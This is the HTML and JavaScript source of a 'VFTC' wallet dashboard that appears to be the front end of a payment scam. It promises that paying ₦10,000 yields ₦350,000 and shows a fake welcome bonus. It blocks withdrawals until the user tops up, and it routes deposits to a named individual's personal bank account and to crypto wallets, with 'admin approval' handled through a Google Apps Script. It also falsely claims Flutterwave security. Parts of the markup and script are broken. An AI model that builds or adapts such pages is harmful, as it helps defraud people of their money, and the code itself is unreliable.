

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>VFTC - Dashboard</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <!-- Navbar -->
  <div class="navbar">
    <div class="welcome">
      <!-- Small Gold Shield Logo for Dashboard -->
<div style="width: 48px; height: 56px; margin-right: 12px;">
  <svg width="100%" height="100%" viewBox="0 0 120 140" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid meet">
    <defs>
      <linearGradient id="goldShield" x1="0%" y1="0%" x2="100%" y2="100%">
        <stop offset="0%" stop-color="#FFEB3B" />
        <stop offset="50%" stop-color="#D4AF37" />
        <stop offset="100%" stop-color="#B8860B" />
      </linearGradient>
      <filter id="softGlow" x="-50%" y="-50%" width="200%" height="200%">
        <feGaussianBlur stdDeviation="2" result="blur"/>
        <feComponentTransfer>
          <feFuncA type="linear" slope="0.6"/>
        </feComponentTransfer>
        <feMerge>
          <feMergeNode/>
          <feMergeNode in="SourceGraphic"/>
        </feMerge>
      </filter>
    </defs>

    <!-- Main shield shape -->
    <path d="M60 10 Q10 40 10 80 Q10 110 40 130 Q60 140 80 130 Q110 110 110 80 Q110 40 60 10 Z" 
          fill="url(#goldShield)" 
          stroke="#B8860B" stroke-width="3.5" filter="url(#softGlow)"/>

    <!-- Inner shine/highlight -->
    <ellipse cx="60" cy="55" rx="38" ry="48" fill="none" stroke="#FFFDF0" stroke-width="5" opacity="0.35"/>

    <!-- Small VFTC initials -->
    <text x="60" y="78" font-family="Arial Black, sans-serif" font-size="28" font-weight="bold" 
          fill="#1a1a1a" text-anchor="middle" letter-spacing="-1">
      VFTC
    </text>
  </svg>
</div>
      <h2>HI <span id="username"></span></h2>
      <span class="status">ğŸ‘‹ğŸ¿</span>
    </div>
    <div class="nav-icons">
      <div style="position: relative;">
        <button class="icon-btn" onclick="toggleNotifications()">ğŸ””</button>
        <div id="notificationDropdown" class="notification-dropdown">
          <div class="notification-item notification-unread">
            <div class="notification-title">Account Activation Required</div>
            <div class="notification-time">Oct 21, 03:40 PM</div>
          </div>
          <div class="notification-item">
            <div class="notification-title">Top-Up Offer Available</div>
            <div class="notification-time">Oct 20, 02:15 PM</div>
          </div>
          
          <div class="notification-item">
            <div class="notification-title">New Feature: Crypto Deposits</div>
            <div class="notification-time">Oct 19, 10:00 AM</div>
          </div>
        </div>
      </div>
      <div style="position: relative;">
        <button class="icon-btn" onclick="toggleSettings()">âš™ï¸</button>
     
      
        <div id="settingsDropdown" class="settings-dropdown">
          <div class="settings-item" onclick="window.location.href='profile.html'">Profile</div>
          <div class="settings-item" onclick="window.location.href='logout.html'">Logout</div>
        </div>
      </div>
    </div>
  </div>
  <!-- Small pending top-up notification (appears only when needed) -->
<div id="pendingNotification" 
     style="display:none; background:black; color: green; padding:10px 16px; margin:10px 16px; border-radius:10px; text-align:center; font-size:14px; border:1px solid black;">
  <strong>Pending top-up:</strong> <span id="pendingInfo"></span>
</div>
  
  <!-- Main Content -->
  <div class="container">
    <!-- Balance Card -->
    <div class="card">
      <div class="card-header">
        <div>
<div style="display: flex; align-items: center; gap: 8px;">
  <div style="position: relative; width: 40px; height: 40px;">
    <img id="dashboardProfilePic"
         src=""
         alt="Profile"
         style="width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 2px solid #D4AF37; display: none;" onclick="window.location.href='profile.html'">
    <div id="dashPlaceholder" 
         style="width: 100%; height: 100%; border-radius: 50%; background: #222; display: flex; align-items: center; justify-content: center; font-size: 20px; border: 2px solid #D4AF37;" onclick="window.location.href='profile.html'">
      ğŸ‘¤
    </div>
  </div>
  <span>Available Balance</span>
</div>
          <div style="font-size: 12px; color: #888;">your Balance</div>
        </div>
        <div 
        <div class="card-actions">
          <button onclick="window.location.href='dashboard.html'" class="btn btn-secondary">ğŸ”„ Refresh</button>
        </div>
      </div>
   <div class="balance">
  <div class="balance" id="balanceDisplay">
    â‚¦â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢
   
  
</div>
      <div class="card-actions">
  <button class="btn btn-secondary" style="flex: 1;" onclick="openSendMoneyModal()">
    ğŸ›°ï¸ transfer Money
  </button>
  
  <button class="btn btn-secondary" style="flex: 1;" onclick="openTopUpModal()">
    ğŸ’³ Top Up Wallet
  </button>
  
  <button class="btn btn-secondary" style="flex: 1;" onclick="openAirtimeModal()">
    ğŸ“± Buy Airtime
  </button>
</div>
</div>
  
      <div class="offer-card">
        <div class="offer-icon">âœ¨</div>
        <div class="offer-text">
          <strong>Top-Up Offer</strong><br>
          <h5>Pay â‚¦10,000 â†’ Get â‚¦350,000</h5>
        </div>
      </div>
    </div>
    
          <div class="offer-card">
        <div class="offer-icon">ğŸ†</div>
        <div class="offer-text">
          <strong>welcome bonus</strong><br>
          â‚¦16,400.80
        </div>
        <h6>+â‚¦16,400.80</h6>
      </div>
      </div>
    

    <!-- Stats Grid -->
    <div class="stats-grid">
      <div class="stat-card">
        <div class="stat-icon">ğŸ“ˆ</div>
        <div class="stat-label">Total Sent</div>
        <div class="stat-value">â‚¦0.00</div>
      </div>
      <div class="stat-card">
        <div class="stat-icon">ğŸ“‰</div>
        <div class="stat-label">Total Received</div>
        <div class="stat-value">â‚¦16,400.80</div>
      </div>
      <div class="stat-card">
        <div class="stat-icon">ğŸ“Š</div>
        <div class="stat-label">Transactions</div>
        <div class="stat-value">0</div>
      </div>
    </div>
<!-- Transaction History -->
<div class="card1">
  <div class="section-title">
    <span class="icon" onclick="window.location.href='admin.html'">ğŸ•’</span>
    Transaction History
  </div>

  <div class="empty-state">
    <!-- existing content -->
  </div>
</div>
  <!-- Floating Chat Button -->
  <div class="chat-float" onclick="openChat()">
    ğŸ’¬
  </div>
  
  <!-- Chat Modal -->
  <div id="chatModal" class="modal" style="display: none;">
    <div class="modal-content">
      <div class="modal-header">
        <div style="display: flex; align-items: center; gap: 8px;">
          <span>ğŸ’¬</span>
          <span>VFTC Support</span>
        </div>
        <div style="display: flex; gap: 8px;">
          <span style="background: #00c853; color: #000; padding: 2px 6px; border-radius: 12px; font-size: 12px;">Online</span>
          <button class="close-btn" onclick="closeChat()">Ã—</button>
        </div>
      </div>
      <div class="chat-body">
        <div class="message received">
          <div class="message-text">Hello! How can I help you today?</div>
          <div class="message-time">10:00</div>
        </div>
      </div>
      <div class="chat-footer">
        <input type="text" placeholder="Type your message..." class="chat-input" />
        <button class="send-btn" onclick="sendMessage()">â¡ï¸</button>
      </div>
    </div>
  </div>
  
  <!-- Top Up Modal -->
  <div id="topUpModal" class="modal" style="display: none;">
    <div class="modal-content">
      <div class="modal-header">
        <h3>Top Up Wallet</h3>
        <button class="close-btn" onclick="closeTopUpModal()">Ã—</button>
      </div>
      <div class="modal-body">
        <div style="text-align: center; margin: 20px 0;">
          <div style="font-size: 16px; color: #ddd;">Payment Amount</div>
          <input type="number" id="topUpAmount" class="amount-input" placeholder="Enter amount" value="10000" oninput="updateAmount()" />
          <div style="color: #00c853; font-size: 14px; margin-top: 5px;">You'll receive more than this amount in your wallet!</div>
        </div>
        
        <div style="margin: 20px 0;">
          <div style="font-size: 16px; color: #ddd; margin-bottom: 10px;">Choose Payment Method</div>
          <div style="display: flex; gap: 10px;">
            <button class="payment-method active" onclick="selectPaymentMethod('bank')">
              ğŸ¦ Bank Transfer
            </button>
            <button class="payment-method" onclick="selectPaymentMethod('crypto')">
              â‚¿ Crypto
            </button>
          </div>
        </div>
        
        <!-- Bank Transfer Section -->
        <div id="bankTransfer" class="bank-transfer">
          <div class="bank-info">
            <div class="bank-field">
              <div class="field-label">Account Number</div>
              <div class="field-value" id="bankAccount">7076464276</div>
              <button class="copy-btn" onclick="copyText('bankAccount')">ğŸ“‹</button>
            </div>
            <div class="bank-field">
              <div class="field-label">Account Holder</div>
              <div class="field-value" id="bankHolder">ABDULSAMAD ADEKOLA IBRAHIM</div>
              <button class="copy-btn" onclick="copyText('bankHolder')">ğŸ“‹</button>
            </div>
            <div class="bank-field">
              <div class="field-label">Bank Name</div>
              <div class="field-value">OPAY</div>

            </div>
                    <button class="btn-primary" style="width: 100%; margin-top: 20px;" onclick="confirmTopUp()">
          Deposit â‚¦<span id="confirmAmount">10,000.00</span>
        </button>
          </div>
          <div class="deposit-from-exchange">
            <div class="deposit-icon">â¬‡ï¸</div>
            <div>
              <div class="deposit-text">Deposit from exchange</div>
              <div class="deposit-subtext">By direct transfer from your account</div>
            </div>
          </div>
        </div>
        
        <!-- Crypto Deposit Section -->
        <div id="cryptoDeposit" class="crypto-deposit
          <!-- BTC -->
          <div class="deposit-warning">
            <span>âš ï¸</span>
            Only send Bitcoin (BTC) assets to this address. Other assets will be lost forever.
          </div>
          <div class="network-list">
            <div class="network-item" onclick="showNetwork('btc')">
              <div class="network-header">
                <div class="coin-logo">â‚¿</div>
                <div class="coin-name">BTC</div>
                <div class="coin-type">COIN</div>
              </div>
            </div>
            <div id="btcDetails" class="network-details" style="display: none;">
              <div class="address" id="btcAddress">
                bc1qr9tc55k97g882yv2y00ejy6ptq8p2h4gkf9dwq
              </div>
              <div class="action-buttons">
                <button class="action-btn" onclick="copyText('btcAddress')"><i>ğŸ“‹</i> Copy</button>
                <button class="action-btn"><i>ğŸ’°</i> Set Amount</button>
                <button class="action-btn"><i>ğŸ“¤</i> Share</button>
              </div>
              <div class="deposit-from-exchange">
                <div class="deposit-icon">â¬‡ï¸</div>
                <div>
                  <div class="deposit-text">Deposit from exchange</div>
                  <div class="deposit-subtext">By direct transfer from your account</div>
                </div>
              </div>
            </div>
          </div>
          
          <!-- ETH -->
          <div class="deposit-warning" style="margin-top: 20px;">
            <span>âš ï¸</span>
            Only send Ethereum (ETH) assets to this address. Other assets will be lost forever.
          </div>
          <div class="network-list">
            <div class="network-item" onclick="showNetwork('eth')">
              <div class="network-header">
                <div class="coin-logo">Î</div>
                <div class="coin-name">ETH</div>
                <div class="coin-type">COIN</div>
              </div>
            </div>
            <div id="ethDetails" class="network-details" style="display: none;">
              <div class="address" id="ethAddress">
                0xb17A52BD18EF364f3634Ae392e579d1771C36462
              </div>
              <div class="action-buttons">
                <button class="action-btn" onclick="copyText('ethAddress')"><i>ğŸ“‹</i> Copy</button>
                <button class="action-btn"><i>ğŸ’°</i> Set Amount</button>
                <button class="action-btn"><i>ğŸ“¤</i> Share</button>
              </div>
              <div class="deposit-from-exchange">
                <div class="deposit-icon">â¬‡ï¸</div>
                <div>
                  <div class="deposit-text">Deposit from exchange</div>
                  <div class="deposit-subtext">By direct transfer from your account</div>
                </div>
              </div>
            </div>
          </div>
          
          <!-- BNB -->
          <div class="deposit-warning" style="margin-top: 20px;">
            <span>âš ï¸</span>
            Only send BNB Smart Chain (BNB) assets to this address. Other assets will be lost forever.
          </div>
          <div class="network-list">
            <div class="network-item" onclick="showNetwork('bnb')">
              <div class="network-header">
                <div class="coin-logo">ğŸª™</div>
                <div class="coin-name">BNB</div>
                <div class="coin-type">COIN</div>
              </div>
            </div>
            <div id="bnbDetails" class="network-details" style="display: none;">
              <div class="address" id="bnbAddress">
                0xb17A52BD18EF364f3634Ae392e579d1771C36462
              </div>
              <div class="action-buttons">
                <button class="action-btn" onclick="copyText('bnbAddress')"><i>ğŸ“‹</i> Copy</button>
                <button class="action-btn"><i>ğŸ’°</i> Set Amount</button>
                <button class="action-btn"><i>ğŸ“¤</i> Share</button>
              </div>
              <div class="deposit-from-exchange">
                <div class="deposit-icon">â¬‡ï¸</div>
                <div>
                  <div class="deposit-text">Deposit from exchange</div>
                  <div class="deposit-subtext">By direct transfer from your account</div>
                </div>
              </div>
            </div>
          </div>
          
          <!-- SOL -->
          <div class="deposit-warning" style="margin-top: 20px;">
            <span>âš ï¸</span>
            Only send Solana (SOL) assets to this address. Other assets will be lost forever.
          </div>
          <div class="network-list">
            <div class="network-item" onclick="showNetwork('sol')">
              <div class="network-header">
                <div class="coin-logo">â—</div>
                <div class="coin-name">SOL</div>
                <div class="coin-type">COIN</div>
              </div>
            </div>
            <div id="solDetails" class="network-details" style="display: none;">
              <div class="address" id="solAddress">
                E4SZcqATefSmw8sQnwrkZTdJVx1PHqBYKjHKL6RkLZKz
              </div>
              <div class="action-buttons">
                <button class="action-btn" onclick="copyText('solAddress')"><i>ğŸ“‹</i> Copy</button>
                <button class="action-btn"><i>ğŸ’°</i> Set Amount</button>
                <button class="action-btn"><i>ğŸ“¤</i> Share</button>
              </div>
              <div class="deposit-from-exchange">
                <div class="deposit-icon">â¬‡ï¸</div>
                <div>
                  <div class="deposit-text">Deposit from exchange</div>
                  <div class="deposit-subtext">By direct transfer from your account</div>
                </div>
              </div>
            </div>
          </div>
          
          <!-- TRX -->
          <div class="deposit-warning" style="margin-top: 20px;">
            <span>âš ï¸</span>
            Only send Tron (TRX) assets to this address. Other assets will be lost forever.
          </div>
          <div class="network-list">
            <div class="network-item" onclick="showNetwork('trx')">
              <div class="network-header">
                <div class="coin-logo">trx</div>
                <div class="coin-name">TRX</div>
                <div class="coin-type">COIN</div>
              </div>
            </div>
            <div id="trxDetails" class="network-details" style="display: none;">
              <div class="address" id="trxAddress">
                TYZVbBfPZEvgCRZViSgctwfGY1ISCAih3D
              </div>
              <div class="action-buttons">
                <button class="action-btn" onclick="copyText('trxAddress')"><i>ğŸ“‹</i> Copy</button>
                <button class="action-btn"><i>ğŸ’°</i> Set Amount</button>
                <button class="action-btn"><i>ğŸ“¤</i> Share</button>
              </div>
              <div class="deposit-from-exchange">
                <div class="deposit-icon">â¬‡ï¸</div>
                <div>
                  <div class="deposit-text">Deposit from exchange</div>
                  <div class="deposit-subtext">By direct transfer from your account</div>
                </div>
              </div>
            </div>
          </div>
          
          <!-- XRP -->
          <div class="deposit-warning" style="margin-top: 20px;">
            <span>âš ï¸</span>
            Only send XRP (XRP) assets to this address. Other assets will be lost forever.
          </div>
          <div class="network-list">
            <div class="network-item" onclick="showNetwork('xrp')">
              <div class="network-header">
                <div class="coin-logo">âœ•</div>
                <div class="coin-name">XRP</div>
                <div class="coin-type">COIN</div>
              </div>
            </div>
            <div id="xrpDetails" class="network-details" style="display: none;">
              <div class="address" id="xrpAddress">
                rJXkgnLxZnKRxKqofZCXZ3W9BuiycxCesA
              </div>
              <div class="action-buttons">
                <button class="action-btn" onclick="copyText('xrpAddress')"><i>ğŸ“‹</i> Copy</button>
                <button class="action-btn"><i>ğŸ’°</i> Set Amount</button>
                <button class="action-btn"><i>ğŸ“¤</i> Share</button>
              </div>
              <div class="deposit-from-exchange">
                <div class="deposit-icon">â¬‡ï¸</div>
                <div>
                  <div class="deposit-text">Deposit from exchange</div>
                  <div class="deposit-subtext">By direct transfer from your account</div>
                  
                </div>
              </div>
            </div>
          </div>
        </div>
       <div>
        </div>
        <div style="text-align: center; margin-top: 15px; font-size: 12px; color: #888;">
          Secure payment powered by Flutterwave<br>
          Your payment information is encrypted and secure
        </div>
      </div>
    </div>
  </div>
  
  <!-- Send Money Modal -->
  <div id="sendMoneyModal" class="modal" style="display: none;">
    <div class="modal-content">
      <div class="modal-header">
        <h3>Enter Account Details</h3>
        <button class="close-btn" onclick="closeSendMoneyModal()">Ã—</button>
      </div>
      <div class="modal-body">
        <div style="background: #2a0000; color: #ff6b6b; padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 14px; display: flex; align-items: center; gap: 8px;">
          <span>âš ï¸</span>
          <div>
            <strong>NOTE</strong><br>
            you must top up  at least 1,500 before you can transfer funds
          </div>
        </div>
        
        
<div style="margin-bottom: 15px;">
  <label style="display: block; color: #ddd; margin-bottom: 5px; font-size: 14px;">Select Bank</label>
  <select id="bank" class="bank-select" onchange="checkForm()">
    <option value="">Choose a bank</option>
    <option value="access">Access Bank Plc</option>
    <option value="wema">Wema Bank Plc</option>
    <option value="kuda">Kuda Bank</option>
    <option value="opay">OPay Digital Services Limited</option>
    <option value="palmpay">PalmPay</option>
    <option value="moniepoint">Moniepoint</option>
  </select>
</div>

<div style="margin-bottom: 15px;">
  <label style="display: block; color: #ddd; margin-bottom: 5px; font-size: 14px;">Account Number</label>
  <input type="text" id="accountNumber" placeholder="0000000000" class="account-number" 
         oninput="verifyAccount(); checkForm()" maxlength="10" />
</div>

<div style="margin-bottom: 15px;">
  <label style="display: block; color: #ddd; margin-bottom: 5px; font-size: 14px;">Account Name</label>
  <input type="text" id="accountName" placeholder="Full name" class="account-number" 
         oninput="verifyName(); checkForm()" />
</div>

<div style="margin-bottom: 15px;">
  <label style="display: block; color: #ddd; margin-bottom: 5px; font-size: 14px;">Amount (â‚¦)</label>
  <input type="text" id="amount" placeholder="5,000" class="account-number" 
         oninput="verifyAmount(); checkForm()" maxlength="10" />
</div>

<button id="proceedBtn" class="btn-primary" style="width: 100%;" disabled>
  Proceed to transfer
</button>
<script src="theme.js"></script>
<script>

 // Load profile picture in dashboard
document.addEventListener("DOMContentLoaded", () => {
  const email = localStorage.getItem("currentUserEmail");
  if (!email) return;
  
  const pic = localStorage.setItem(`profilePic_${email}`, ev.target.result);
  const img = document.getElementById("dashboardProfilePic");
  const placeholder = document.getElementById("dashPlaceholder");
  
  if (pic && img && placeholder) {
    // Small delay helps mobile browsers render data URLs
    setTimeout(() => {
      img.src = pic;
      img.style.display = "block";
      placeholder.style.display = "none";
    }, 300);
  }
});
// Balance Toggle
    // Dynamic balance per user
let balance = 0; // default
let balanceVisible = false;
const maskedBalance = "â‚¦â€¢â€¢â€¢â€¢â€¢â€¢â€¢";

function formatBalance(amount) {
  return "â‚¦" + amount.toLocaleString('en-NG', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// Load user's balance when page opens
document.addEventListener("DOMContentLoaded", function() {
  const email = localStorage.getItem("currentUserEmail");
  if (email) {
    const users = JSON.parse(localStorage.getItem("users")) || [];
    const user = users.find(u => u.email === email);
    if (user && typeof user.balance === 'number') {
      balance = user.balance;
      // Show masked balance by default on load
      document.getElementById('balanceDisplay').innerHTML =
        maskedBalance + '<button class="toggle-balance" onclick="toggleBalance()">ğŸ‘ï¸</button>';
    }
  }
});

function toggleBalance() {
  const display = document.getElementById('balanceDisplay');
  if (balanceVisible) {
    display.innerHTML = maskedBalance + '<button class="toggle-balance" onclick="toggleBalance()">ğŸ‘ï¸</button>';
    balanceVisible = false;
  } else {
    const visibleBalance = formatBalance(balance);
    display.innerHTML = visibleBalance + '<button class="toggle-balance" onclick="toggleBalance()">ğŸ™ˆ</button>';
    balanceVisible = true;
  }
}
// Simple validation functions (you can make them stricter)
function verifyAccount() {
  const input = document.getElementById('accountNumber');
  // Basic: only allow digits
  input.value = input.value.replace(/\D/g, '');
  // You can add more checks (e.g. exactly 10 digits) here later
}

function verifyName() {
  const input = document.getElementById('accountName');
  // Optional: remove numbers or special chars if you want
  // input.value = input.value.replace(/[^a-zA-Z\s]/g, '');
}

function verifyAmount() {
  const input = document.getElementById('amount');
  // Allow only numbers and comma
  input.value = input.value.replace(/[^0-9,]/g, '');
}

// Enable/disable button based on all fields
function checkForm() {
  const bank        = document.getElementById('bank').value.trim();
  const accNumber   = document.getElementById('accountNumber').value.trim();
  const accName     = document.getElementById('accountName').value.trim();
  const amount      = document.getElementById('amount').value.trim();

  const btn = document.getElementById('proceedBtn');

  const isFilled = 
    bank !== "" &&
    accNumber.length >= 8 &&    // most Nigerian banks use 10, but some allow less
    accName.length >= 2 &&
    amount !== "" && amount !== "0" && amount !== ",";

  btn.disabled = !isFilled;

  // Optional: change appearance when active
  if (isFilled) {
    btn.style.opacity = "1";
    btn.style.cursor = "pointer";
  } else {
    btn.style.opacity = "0.6";
    btn.style.cursor = "not-allowed";
  }
}


// Format balance (used for display)
function formatBalance(amount) {
  return "â‚¦" + amount.toLocaleString('en-NG', { 
    minimumFractionDigits: 2, 
    maximumFractionDigits: 2 
  });
}

// Handle Proceed to transfer button
document.getElementById('proceedBtn').addEventListener('click', function() {
  if (this.disabled) return;

  // Get entered amount (remove commas if any)
  const amountStr = document.getElementById('amount').value.trim().replace(/,/g, '');
  const amount = parseFloat(amountStr) || 0;

  if (amount <= 0) {
    alert("Please enter a valid amount");
    return;
  }

  // Get current user
  const email = localStorage.getItem("currentUserEmail");
  if (!email) {
    alert("Please log in first");
    return;
  }

  let users = JSON.parse(localStorage.getItem("users")) || [];
  const userIndex = users.findIndex(u => u.email === email);

  if (userIndex === -1) {
    alert("User not found");
    return;
  }

  let userBalance = users[userIndex].balance || 0;

  if (amount > userBalance) {
    alert("Insufficient balance");
    return;
  }

// âœ… SAVE TRANSFER DETAILS TEMPORARILY
localStorage.setItem("pendingTransfer", JSON.stringify({
  email: email,
  amount: amount,
  bank: document.getElementById("bank").value,
  accountNumber: document.getElementById("accountNumber").value,
  accountName: document.getElementById("accountName").value,
  timestamp: new Date().toISOString()
}));
  // âœ… THEN redirect
  window.location.href = 'processing-withdrawal.html';
});
// Run form check on load
checkForm();

</script>
      </div>
    </div>
  </div>
  <!-- Airtime Modal -->
<div id="airtimeModal" class="modal" style="display:none;">
  <div class="modal-content">
    
    <div class="modal-header">
      <h3>Buy Airtime</h3>
      <button class="close-btn" onclick="closeAirtimeModal()">Ã—</button>
    </div>
    
    <div class="modal-body">
      
      <label>Network</label>
      <select id="network" class="bank-select">
        <option value="MTN">MTN</option>
        <option value="Airtel">Airtel</option>
        <option value="Glo">Glo</option>
        <option value="9mobile">9mobile</option>
      </select>
      
      <label>Phone Number</label>
      <input type="text" id="phoneNumber" class="amount-input" placeholder="number">
      
      <label>Amount</label>
      <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:15px;">
  
  <button class="btn airtime-btn" onclick="setAirtimeAmount(this,100)">â‚¦100</button>
  
  <button class="btn airtime-btn" onclick="setAirtimeAmount(this,200)">â‚¦200</button>
  
  <button class="btn airtime-btn" onclick="setAirtimeAmount(this,500)">â‚¦500</button>
  
  <button class="btn airtime-btn" onclick="setAirtimeAmount(this,1000)">â‚¦1000</button>
  
  <button class="btn airtime-btn" onclick="setAirtimeAmount(this,2000)">â‚¦2000</button>
  
  
  
</div>
<div style="margin-bottom:15px;">
  
  <div style="margin-bottom:8px;color:#ddd;">Select Network</div>
  
<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px;">
  
  <div class="network-btn" onclick="selectNetwork(this,'MTN')">
    <img src="images/mtn.png">
    <span>MTN</span>
  </div>
  
  <div class="network-btn" onclick="selectNetwork(this,'Airtel')">
    <img src="images/airtel.png">
    <span>Airtel</span>
  </div>
  
  <div class="network-btn" onclick="selectNetwork(this,'Glo')">
    <img src="glo.svg">
    <span>Glo</span>
  </div>
  
  <div class="network-btn" onclick="selectNetwork(this,'9mobile')">
    <img src="9mobile.jpeg">
    <span>9mobile</span>
  </div>
  
</div>
      <input type="number" id="airtimeAmount" class="amount-input" placeholder="Enter amount">
      
      <button class="btn-primary" style="width:100%;" onclick="buyAirtime()">
        Buy Airtime
      </button>
      
      
      
    </div>
    
  </div>
</div>
<!-- Airtime Coming Soon Popup -->
<div id="airtimeComingSoon" class="modal" style="display:none;">
  <div class="modal-content" style="max-width: 360px; text-align: center; padding: 32px 24px; border-radius: 16px;">
    <div style="font-size: 48px; margin-bottom: 16px;">ğŸš§âœ¨</div>
    <h2 style="margin: 0 0 12px; font-size: 24px;">Coming Soon</h2>
    <p style="margin: 0 0 28px; color: #ccc; line-height: 1.5;">
      Airtime recharge is currently under development.<br>
      We're working to make it available very soon â€” thank you for your patience!
    </p>
    <button class="btn-primary" style="min-width: 160px; padding: 12px 24px;"
            onclick="document.getElementById('airtimeComingSoon').style.display='none'; closeAirtimeModal();">
      Got It
    </button>
  </div>
</div>

  <script src="app.js"></script>
  <script>
  // Load profile picture in dashboard (matches the key used in profile.html)
  document.addEventListener("DOMContentLoaded", function() {
    const email = localStorage.getItem("currentUserEmail");
    if (!email) return;
    
    // Try both possible keys (in case of previous versions)
    const savedPic = localStorage.getItem(`pfp_${email}`) || localStorage.getItem(`profilePic_${email}`);
    
    const img = document.getElementById("dashboardProfilePic");
    const ph = document.getElementById("dashPlaceholder");
    
    if (savedPic && img && ph) {
      // Extra delay + reflow for mobile reliability
      setTimeout(() => {
        img.src = savedPic;
        img.style.display = "block";
        ph.style.display = "none";
        // Force mobile browser to redraw
        img.style.opacity = "0.99";
        setTimeout(() => { img.style.opacity = "1"; }, 50);
      }, 400);
    }
  });
</script>
<script>
  // Show small pending notification
  document.addEventListener("DOMContentLoaded", function() {
    const email = localStorage.getItem("currentUserEmail");
    if (!email) return;
    
    const pending = JSON.parse(localStorage.getItem("pendingTopUps")) || [];
    const userPending = pending.filter(req => req.email === email && req.status === 'pending');
    
    const notif = document.getElementById("pendingNotification");
    const info = document.getElementById("pendingInfo");
    
    if (userPending.length > 0) {
      // Show only the most recent pending one (or total count)
      const latest = userPending[userPending.length - 1];
      info.textContent = `â‚¦${latest.amount.toLocaleString()} awaiting approval`;
      notif.style.display = "block";
    } else {
      notif.style.display = "none";
    }
  });
</script>
<script>
  // Handle deposit button
  
  // Optional: Refresh balance on dashboard load (in case approved)
  document.addEventListener("DOMContentLoaded", () => {
    toggleBalance(); // or call your balance refresh if needed
  });
function confirmTopUp() {
  const amountInput = document.getElementById("topUpAmount");
  const amount = parseFloat(amountInput.value) || 0;
  
  if (amount <= 0) {
    alert("Enter a valid amount");
    return;
  }
  
  const email = localStorage.getItem("currentUserEmail");
  if (!email) {
    alert("Please login first");
    return;
  }
  
  const url = "https://script.google.com/macros/s/AKfycbzNmhW7MH-WAazJ4mA2NAVa2QdaFHl0Rx09fnC5hu95zITdaa5QlZbE-sjIUPUDyahx3Q/exec"; // â† paste fresh URL
  
  fetch(url, {
      method: "POST",
      redirect: "follow",
      body: JSON.stringify({ email: email, amount: amount, action: "deposit" }),
      headers: {
        "Content-Type": "text/plain;charset=utf-8" // â† critical for iOS Safari
      }
    })
    .then(r => r.json())
    .then(data => {
      if (data.success) {
        alert("Request sent! â‚¦" + amount.toLocaleString() + " â€“ waiting for admin approval.");
        // close modal
        document.getElementById("topUpModal").style.display = "none";
        // optional: show pending notice
      } else {
        alert("Error: " + (data.error || "Unknown problem"));
      }
    })
    .catch(err => {
      console.error(err);
      alert("Connection failed â€“ check internet or try again later.\nDetails: " + err.message);
    });
}
</script>
<script>
// Transaction history - full working version
let transactions = [];

// Load transactions for current user
function loadTransactions() {
  const email = localStorage.getItem("currentUserEmail");
  if (!email) return;

  const key = `transactions_${email}`;
  transactions = JSON.parse(localStorage.getItem(key)) || [];

  renderTransactions();
  updateClearButtonVisibility();
}

// Save transactions
function saveTransactions() {
  const email = localStorage.getItem("currentUserEmail");
  if (!email) return;

  const key = `transactions_${email}`;
  localStorage.setItem(key, JSON.stringify(transactions));
}

// Render transactions
function renderTransactions() {
  const container = document.querySelector(".card1 .empty-state");
  if (!container) return;

  if (transactions.length === 0) {
    container.innerHTML = `
      <ol>
        <div class="icon"></div>
        <li><p><h3>No transactions yet</h3></p></li>
      </ol>
    `;
  } else {
    let html = '<ol>';
    transactions.slice().reverse().forEach(tx => {
      const isPositive = tx.amount > 0;
      const sign = isPositive ? '+' : '-';
      const color = isPositive ? '#00c853' : '#ff6b6b';

      html += `
        <li style="margin-bottom: 15px; padding: 10px; border-bottom: 1px solid #333;">
          <div style="display: flex; justify-content: space-between; align-items: center;">
            <div>
              <strong style="color: ${color};">${sign}${Math.abs(tx.amount).toLocaleString('en-NG', {minimumFractionDigits: 2})}</strong>
              <br>
              <small style="color: #888;">${tx.date}</small>
            </div>
            <div style="text-align: right;">
              <div>${tx.type}</div>
              <small style="color: ${tx.status === 'success' ? '#00c853' : '#ff6b6b'};">${tx.status}</small>
            </div>
          </div>
        </li>
      `;
    });
    html += '</ol>';
    container.innerHTML = html;
  }

  updateClearButtonVisibility();
}

// Show/hide clear button based on transactions
function updateClearButtonVisibility() {
  const btn = document.getElementById("clearHistoryBtn");
  if (btn) {
    btn.style.display = transactions.length > 0 ? 'inline-block' : 'none';
  }
}

// Add a transaction (call this from airtime, transfer, etc.)
function addTransaction(type, amount, status = 'success') {
  const date = new Date().toLocaleString('en-NG', {
    day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit'
  });

  transactions.push({ type, amount, status, date });
  saveTransactions();
  renderTransactions();
}

// Clear history
document.addEventListener("DOMContentLoaded", () => {
  const clearBtn = document.getElementById("clearHistoryBtn");

  if (clearBtn) {
    clearBtn.addEventListener("click", () => {
      if (confirm("Clear all transaction history?\nThis cannot be undone.")) {
        const email = localStorage.getItem("currentUserEmail");
        if (email) {
          const key = `transactions_${email}`;
          localStorage.removeItem(key);
          transactions = [];
          renderTransactions();
          alert("Transaction history cleared!");
        }
      }
    });
  }

  // Load on page start
  loadTransactions();
});
</script>
<script>
  // Clear transaction history
  document.addEventListener("DOMContentLoaded", () => {
    const clearBtn = document.getElementById("clearHistoryBtn");
    
    if (clearBtn) {
      clearBtn.addEventListener("click", () => {
        if (confirm("Clear all transaction history?\nThis cannot be undone.")) {
          const email = localStorage.getItem("currentUserEmail");
          if (email) {
            const key = `transactions_${email}`;
            localStorage.removeItem(key);
            transactions = []; // clear local array
            renderTransactions(); // refresh the UI
            alert("Transaction history cleared!");
          } else {
            alert("No user logged in");
          }
        }
      });
    }
  });
</script>
</body>
<script>



// BUY AIRTIME
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function buyAirtime() {
  // Show the nice coming-soon popup instead of processing
  document.getElementById("airtimeComingSoon").style.display = "flex";
  
